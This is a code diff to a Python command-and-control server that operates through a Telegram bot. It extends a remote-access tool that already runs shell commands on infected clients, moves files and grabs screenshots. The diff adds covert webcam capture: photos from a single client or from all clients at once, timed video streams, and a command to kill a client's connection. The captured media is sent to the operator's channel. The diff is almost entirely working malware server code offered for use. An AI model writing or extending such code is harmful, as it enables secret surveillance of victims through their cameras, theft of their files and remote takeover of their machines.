@@ -90,7 +90,8 @@ class C2Server:
                     f"ℹ️ *Global Commands* ℹ️\n"
                     f"- */shutdown* - Shut down server\n"
                     f"- */sendall* <command> - Execute in the command in all the clients\n"
-                    f"- */statusall* - Check status for every client\n",
+                    f"- */statusall* - Check status for every client\n"
+                    f"- */photoall* - Take a photo from all clients\n",
         parse_mode="Markdown")
 
         while True:
@@ -127,7 +128,7 @@ class C2Server:
             info = data.split("|")
             session.username, session.os_version = info[0], info[1]
 
-            conn = sqlite3.connect("c2.db")
+            conn = sqlite3.connect("agents.db")
             cursor = conn.cursor()
             topic_title = f"Client {session.username} ({session.ip})"
             response = bot.create_forum_topic(C2_CHANNEL_ID, topic_title)
@@ -143,6 +144,7 @@ class C2Server:
             help_message = (
                 "ℹ️ *Client commands:*\n"
                 "- `/delete` - Delete topic\n"
+                "- `/kill` - Kills the connection with the client\n"
                 "- `/status` - Check if the client is online\n"
                 "- `/shell <command>` - Execute command in the client\n\n"
                 "🖥️ *Screen Commands:*🖥️\n"
@@ -150,7 +152,11 @@ class C2Server:
                 "📂 *Files Commands:* 📂\n"
                 "- `/download <file_path>` - Download a file from the client\n"
                 "- `/upload <file_path>` - Upload a file from the server to the client\n"
-                "- `Also you can send a file directly in the chat to the client`"
+                "- `Also you can send a file directly in the chat to the client`\n\n"
+                "📷 *Web cam commands:* 📷\n"
+                "- `/listwebcams` - List availables webcams\n"
+                "- `/photo <camera index>` - captures a image from the camera and send it here\n"
+                "- `/stream <camera index> <duration> <fps>` - captures a image from the camera and send it here\n"
             )
 
             ip_info = self.get_info_ip(session.ip)
@@ -179,7 +185,7 @@ class C2Server:
             self.handle_global_command(message)
             return
 
-        conn = sqlite3.connect("c2.db")
+        conn = sqlite3.connect("agents.db")
         cursor = conn.cursor()
         cursor.execute("SELECT ip FROM clients WHERE topic_id = ?", (message.message_thread_id,))
         client = cursor.fetchone()
@@ -214,6 +220,20 @@ class C2Server:
             bot.send_message(C2_CHANNEL_ID, "📁 Uploading file...", message_thread_id=message.message_thread_id)
             self.send_file(self.clients[client_ip], text.replace("/upload ", ""), message.message_thread_id)
 
+        elif text == "/kill":
+            self.kill(message, self.clients[client_ip])
+
+        elif text == "/listwebcams":
+            self.send_command_to_client(self.clients[client_ip], "listwebcams", message.message_thread_id)
+
+        elif text.startswith("/photo"):
+            cmd = text.replace("/photo ", "")
+            bot.send_message(C2_CHANNEL_ID, "📸 Taking photo...", message_thread_id=message.message_thread_id)
+            self.send_command_to_client(self.clients[client_ip], f"photo {cmd}", message.message_thread_id)
+
+        elif text.startswith("/stream"):
+            self.stream(text, self.clients[client_ip], message)
+
     def handle_global_command(self, message):
         text = message.text.lower()
 
@@ -225,6 +245,9 @@ class C2Server:
 
         elif text == "/statusall":
             self.statusall()
+
+        elif text == "/photoall":
+            self.photoall(message)
 
     def statusall(self):
         to_remove = []
@@ -250,9 +273,38 @@ class C2Server:
             del self.clients[ip]
 
     def shutdown_server(self):
-        bot.send_message(C2_CHANNEL_ID, "[!] Shutting down the sever...")
+        bot.send_message(C2_CHANNEL_ID, "❌ Shutting down the sever...")
         import os, signal
         os.kill(os.getpid(), signal.SIGINT)
+
+    def kill(self, message, client_session):
+        client_ip = client_session.ip
+        if client_ip in self.clients:
+            self.send_command_to_client(client_session, "kill", message.message_thread_id)
+            client_session.close()
+            del self.clients[client_ip]
+            bot.send_message(C2_CHANNEL_ID, f"💀 Client `{client_ip}` has been killed.", parse_mode="Markdown", message_thread_id=message.message_thread_id)
+        else:
+            bot.send_message(C2_CHANNEL_ID, f"❌ Client not found.", message_thread_id=message.message_thread_id)
+
+    def photoall(self, message):
+        for ip, session in list(self.clients.items()):
+            try:
+                self.send_command_to_client(session, "photo 0", message.message_thread_id)
+            except Exception as e:
+                bot.send_message(C2_CHANNEL_ID, f"❌ Error taking photo from {ip}: {e}", message_thread_id=message.message_thread_id)
+
+    def stream(self, text, client_session, message):
+        bot.send_message(C2_CHANNEL_ID, "🎥 Recording Video...", message_thread_id=message.message_thread_id)
+        client_ip = client_session.ip
+        args = text.split()
+        if len(args) >= 2:
+            cmd = f"stream {args[1]}"
+            if len(args) == 4:
+                cmd += f" {args[2]} {args[3]}"
+            self.send_command_to_client(self.clients[client_ip], cmd, message.message_thread_id)
+        else:
+            bot.send_message(C2_CHANNEL_ID, "⚠️ Usage: /stream <cam_index> [duration] [fps]", message_thread_id=message.message_thread_id)
 
     def send_file(self, client_socket, file, topic_id):
         try:
@@ -265,7 +317,7 @@ class C2Server:
                 command = f"[!] The file {file} does not exist."
             self.send_command_to_client(client_socket, command, topic_id)
         except Exception as e:
-            bot.send_message(C2_CHANNEL_ID, f"[!] Error sending the file: {e}")
+            bot.send_message(C2_CHANNEL_ID, f"❌ Error sending the file: {e}")
 
     def sendall(self, text):
         command = text.replace("/sendall ", "")
@@ -280,25 +332,25 @@ class C2Server:
         session = self.clients.get(client_ip)
 
         if not session:
-            bot.send_message(C2_CHANNEL_ID, "[!] Client not found", message_thread_id=message_thread_id)
+            bot.send_message(C2_CHANNEL_ID, "❌ Client not found", message_thread_id=message_thread_id)
             return
 
         try:
             response = self.execute_shell_command(session, "whoami")
 
             if response and response != "[No response]":
-                bot.send_message(C2_CHANNEL_ID, "[+] Client *ONLINE*", message_thread_id=message_thread_id, parse_mode="Markdown")
+                bot.send_message(C2_CHANNEL_ID, "✅ Client *ONLINE*", message_thread_id=message_thread_id, parse_mode="Markdown")
             else:
-                bot.send_message(C2_CHANNEL_ID, "[!] Client *NO RESPONSE*", message_thread_id=message_thread_id, parse_mode="Markdown")
+                bot.send_message(C2_CHANNEL_ID, "❌ Client *NO RESPONSE*", message_thread_id=message_thread_id, parse_mode="Markdown")
 
         except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError) as e:
-            bot.send_message(C2_CHANNEL_ID, f"[!] Client *DISCONNECTED*", message_thread_id=message_thread_id, parse_mode="Markdown")
+            bot.send_message(C2_CHANNEL_ID, f"❌ Client *DISCONNECTED*", message_thread_id=message_thread_id, parse_mode="Markdown")
             print(colored(f"[!] Client {client_ip} disconnected: {e}", 'red'))
             session.close()
             del self.clients[client_ip]
 
         except Exception as e:
-            bot.send_message(C2_CHANNEL_ID, f"[!] Error checking client status: {e}", message_thread_id=message_thread_id)
+            bot.send_message(C2_CHANNEL_ID, f"❌ Error checking client status: {e}", message_thread_id=message_thread_id)
 
 
     def execute_shell_command(self, client_socket, command):
@@ -311,11 +363,16 @@ class C2Server:
 
     def send_command_to_client(self, client_socket, command, topic_id):
         try:
+            if command.lower() == "kill":
+                encrypted_command = self.encrypt_message(command)
+                client_socket.socket.send(encrypted_command)
+                return  
+
             encrypted_command = self.encrypt_message(command)
             client_socket.socket.send(encrypted_command)
             
             response = self.recv_all(client_socket.socket).strip()
-            response = self.decrypt_message(response.encode()).strip()
+            response = self.decrypt_message(response).strip()
 
             if response.startswith("[screenshot]"):
                 self.recv_img(response, topic_id)
@@ -329,12 +386,19 @@ class C2Server:
             elif response == "[Error uploading file]":
                 bot.send_message(C2_CHANNEL_ID, "❌ Error uploading file", message_thread_id=topic_id)
 
+            elif response.startswith("[photo]"):
+                self.recv_webcam(response, topic_id)
+
+            elif response.startswith("[video]"):
+                self.recv_video(response, topic_id)
+
+
             else:
                 if len(response) > 4000:
                     response = response[:4000] + "\n[...truncated]"
                 bot.send_message(C2_CHANNEL_ID, response, message_thread_id=topic_id)
         except Exception as e:
-            bot.send_message(C2_CHANNEL_ID, f"[!] Error executing the command: {e}", message_thread_id=topic_id)
+            bot.send_message(C2_CHANNEL_ID, f"❌ Error executing the command: {e}", message_thread_id=topic_id)
 
     def recv_file(self, response, topic_id):
         args = response.split()
@@ -349,6 +413,17 @@ class C2Server:
             bot.send_document(C2_CHANNEL_ID, file, caption="📁 File received", message_thread_id=topic_id)
             os.remove(file_name)
 
+    def recv_webcam(self, response, topic_id):
+        img_data = response.replace("[photo] ", "")
+        img_bytes = base64.b64decode(img_data)
+
+        with open("webcam.jpg", "wb") as f:
+            f.write(img_bytes)
+
+        with open("webcam.jpg", "rb") as photo:
+            bot.send_photo(C2_CHANNEL_ID, photo, caption="📸 Webcam capture", message_thread_id=topic_id)
+            os.remove("webcam.jpg")
+
     def recv_img(self, response, topic_id):
         image_data = response.replace("[screenshot]", "")
         image_bytes = base64.b64decode(image_data)
@@ -360,15 +435,30 @@ class C2Server:
             bot.send_photo(C2_CHANNEL_ID, photo, caption="📸 Screenshot received", message_thread_id=topic_id)
             os.remove("screenshot.png")
 
+    def recv_video(self, response, topic_id):
+        video_data = response.replace("[video] ", "")
+        video_bytes = base64.b64decode(video_data)
+
+        with open("webcam.mp4", "wb") as f:
+            f.write(video_bytes)
+
+        with open("webcam.mp4", "rb") as video:
+            bot.send_video(C2_CHANNEL_ID, video, caption="🎥 Webcam Stream", message_thread_id=topic_id)
+            os.remove("webcam.mp4")
+
+
     def recv_all(self, sock):
         size_data = b""
         while len(size_data) < 10:
             part = sock.recv(10 - len(size_data))
             if not part:
-                break
+                return b""
             size_data += part
 
-        total_size = int(size_data.decode("utf-8"))
+        try:
+            total_size = int(size_data.decode("utf-8").strip())
+        except ValueError:
+            return b""
 
         data = b""
         while len(data) < total_size:
@@ -377,7 +467,8 @@ class C2Server:
                 break
             data += part
 
-        return data.decode("utf-8", errors="ignore")
+        return data
+
 
     def encrypt_message(self, message: str) -> bytes:
         iv = os.urandom(16)
@@ -387,15 +478,20 @@ class C2Server:
 
     def decrypt_message(self, encrypted_message: bytes) -> str:
         try:
+            if not encrypted_message or len(encrypted_message) < 16:
+                return "❌ Error decrypting message: empty or invalid data"
+            
             raw = base64.b64decode(encrypted_message)
+            if len(raw) < 16:
+                return "❌ Error decrypting message: invalid IV"
+
             iv = raw[:16]
             encrypted = raw[16:]
             cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
             decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
             return decrypted.decode()
         except Exception as e:
-            return f"[!] Error decrypting message: {e}"
-
+            return f"❌ Error decrypting message: {e}"
 
     def shutdown(self, sig, frame):
         print(colored("\n[!] Shuting Down the server...", 'red'))
@@ -419,7 +515,7 @@ def handle_document(message):
         file_data_b64 = base64.b64encode(downloaded_file).decode()
         file_name = message.document.file_name
 
-        conn = sqlite3.connect("c2.db")
+        conn = sqlite3.connect("agents.db")
         cursor = conn.cursor()
         cursor.execute("SELECT ip FROM clients WHERE topic_id = ?", (message.message_thread_id,))
         result = cursor.fetchone()
